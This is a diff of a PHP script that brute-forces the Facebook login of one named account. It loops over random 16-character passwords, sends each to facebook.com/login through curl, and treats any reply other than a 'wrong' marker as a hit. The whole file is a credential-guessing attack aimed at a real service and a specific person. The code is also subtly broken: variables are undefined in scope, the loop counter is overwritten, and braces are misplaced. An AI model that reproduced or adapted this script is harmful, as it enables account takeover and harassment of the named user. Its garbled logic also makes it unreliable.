@@ -1,12 +1,14 @@
 <?php
 
+global $incorrect;
+global $startpagina;
 $username = "charlotte.scheurleer1";
 echo "https://twitter.com/LizardL4nds";
 while(True) {
     for ($Pass = 1; $Pass < 16; $Pass++) {
         if ($Pass == 1){$Pass = substr(str_shuffle("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"), 1, 16);}
         if(check_correct($username, $Pass)) {
-            if (false) {
+            if ($str != $startpagina) {
             echo "<table cellpadding='0' cellspacing='0' boreder='1' align='center' class='raster_table' width='75%'>
     <tr>
         <td>
@@ -18,8 +20,8 @@ while(True) {
 </html>";
             }
         }
-    }
-    if (true) {
+    
+    if ($str != $incorrect) {
     echo "<table cellpadding='0' cellspacing='0' boreder='1' align='center' class='raster_table' width='75%'>
     <tr>
         <td>
@@ -30,12 +32,13 @@ ce attack.</b></div>
 </table>";
     }
 }
+}
 echo "</body>
 </html>";
 // Function for checking whether the username and password are correct
 function check_correct($username, $Pass)
 {
-        global $wrong, $headers;
+        global $incorrect, $headers;
         $c = curl_init('https://www.facebook.com/login');
         curl_setopt($c, CURLOPT_HTTPAUTH, CURLAUTH_ANY); // use authentication
         curl_setopt($c, CURLOPT_POST, 1);
@@ -47,7 +50,7 @@ function check_correct($username, $Pass)
         curl_setopt($c, CURLOPT_UNRESTRICTED_AUTH, 1); // always stay authorised
         $str = curl_exec($c); // Get it
         curl_close($c);
-        if($str != $wrong) {return true;}
+        if($str != $incorrect) {return true;}
         else {return false;}
 }
 
